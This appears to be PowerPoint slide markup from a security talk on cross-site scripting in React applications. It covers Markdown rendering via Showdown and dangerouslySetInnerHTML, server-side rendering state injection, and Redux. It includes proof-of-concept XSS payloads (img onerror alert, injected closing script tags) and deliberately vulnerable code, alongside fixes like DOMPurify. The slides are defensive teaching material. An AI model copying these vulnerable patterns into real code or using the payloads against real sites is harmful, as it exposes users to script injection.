                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>:"</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183974950"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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548" y="1241597"/>
            <a:ext cx="5529969" cy="3109503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="219976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XSS via JavaScript URI Demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Good old JavaScript schema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="759345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XSS with Markdown </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="10972800" cy="456867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Need to display Rich Text? Use Markdown.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3090966"/>
            <a:ext cx="10972800" cy="407517"/>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t>Display Markdown in React:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="5098755"/>
            <a:ext cx="10972800" cy="1214959"/>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dirty="0"/>
              <a:t>Problem:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Showdown doesn’t strip out HTML from Markdown &gt; DOM-XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Solution:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> sanitize Markdown with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DomPurify</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="2033067"/>
            <a:ext cx="5229726" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>#This is my first post</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>##And, perhaps, the last one</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>img</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src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=alert('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NoCSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>') /&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3633052"/>
            <a:ext cx="5229726" cy="1331134"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>convertToMarkdown</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markdown</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converter </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showdown</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Converter</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data </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converter</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makeHtml</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markdown</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__html</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data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9" name="Table 8"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="290401468"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6141696" y="3632849"/>
          <a:ext cx="5440704" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="5440704">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2631727392"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="512968">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>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div</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>dangerouslySetInnerHTML</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>{</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>this.convertToMarkdown</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>this.state.userinput</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>)}</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                    </a:p>
                    <a:p>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div</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69286949"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 1"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="609600" y="3364598"/>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8573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XSS with Markdown Demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Markdown alone will not save you</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36888021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Side Rendering</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4960620" y="6226629"/>
            <a:ext cx="6774180" cy="188460"/>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000" dirty="0"/>
              <a:t>https://medium.com/walmartlabs/the-benefits-of-server-side-rendering-over-client-side-rendering-5d07ff2cefe8</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0196" y="1089746"/>
            <a:ext cx="7204604" cy="5136883"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="4270280" cy="5000625"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Benefits: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Performance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Consistent SEO</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Architecture:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Similar to server-side templates</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Security:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Adding untrusted data on the server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Data may be added directly to the DOM without React protections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2393787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Side Rendering</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="10972800" cy="1109573"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Two steps of SSR:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Render the HTML – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>renderToString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set initial state – passed as a JSON object into a &lt;script&gt; tag and set to a global variable</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3447366"/>
            <a:ext cx="10972800" cy="1109573"/>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State is a JSON array</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cannot break out of JSON</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Can inject angle brackets into user-controlled values</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Table 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="788788368"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="4556939"/>
          <a:ext cx="10972800" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="10972800">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3948536230"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="414876">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>window.__APP_INITIAL_STATE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>__ = {"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>isMobile</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>":</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>true,"name":"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>Ksenia</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">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16544889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82897736"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2580429"/>
          <a:ext cx="10972800" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="10972800">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1899153274"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="414876">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>window.__PRELOADED_STATE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>__ = ${</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>preloadedState</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">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3131576576"/>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192643002"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="4545798"/>
          <a:ext cx="10972800" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="10972800">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1673865349"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="414876">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>window.__APP_INITIAL_STATE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>__ = {"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>isMobile</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>":</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>true,"name</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>":"</a:t>
                      </a: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&gt;&lt;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r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>alert(1)</a:t>
                      </a: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r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">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146592274"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="5367483"/>
            <a:ext cx="10972800" cy="1109573"/>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Vulnerable code in tutorials:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://medium.com/front-end-hacking/server-side-rendering-with-react-and-express-382591bfc77c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="73916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XSS with Server Side Rendering Demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Passing state from the server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2139721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XSS in Redux</a:t>
            </a:r>
          </a:p>
